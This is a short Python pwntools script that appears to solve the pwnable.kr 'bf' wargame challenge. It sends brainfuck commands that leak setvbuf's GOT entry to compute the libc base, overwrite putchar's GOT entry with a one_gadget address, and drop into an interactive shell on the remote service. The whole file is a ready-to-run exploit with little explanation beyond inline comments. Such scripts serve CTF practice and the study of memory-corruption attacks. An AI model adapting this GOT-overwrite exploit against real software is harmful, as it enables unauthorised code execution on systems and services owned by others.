from pwn import *

gdbscript = '''
set follow-fork-mode child
b *0x8048655
c
'''

LOCAL = input('local? ').strip().lower()

if LOCAL == 'y':
  context.terminal =  ["tmux", "splitw", "-h"]
  p = gdb.debug('./bf_patched', gdbscript)
else:
  p = remote('pwnable.kr', 9001)

p.readuntil(b'[ ]')

'''infoleak starts here'''
# move to setvbuf@got
exploit = b'<'*120
# leak it
exploit += b'.>.>.>.>'

'''exploit starts here'''
# need to shift 4 bytes to reach putchar's address
exploit += b'>>>>'
# actually write the bytes
exploit += b',>,>,>,>'
# call putchar
exploit += b'.'

p.sendline(exploit)
p.readline()

# leaking setvbuf
elf = ELF('./bf_libc.so')
LIBC_BASE = u32(p.recv(4)) - elf.symbols['setvbuf']
print(hex(LIBC_BASE))
ONE_GADGET = LIBC_BASE + 0x5fbd5

# overwriting putchar and calling system
p.send(p32(ONE_GADGET))
p.interactive()
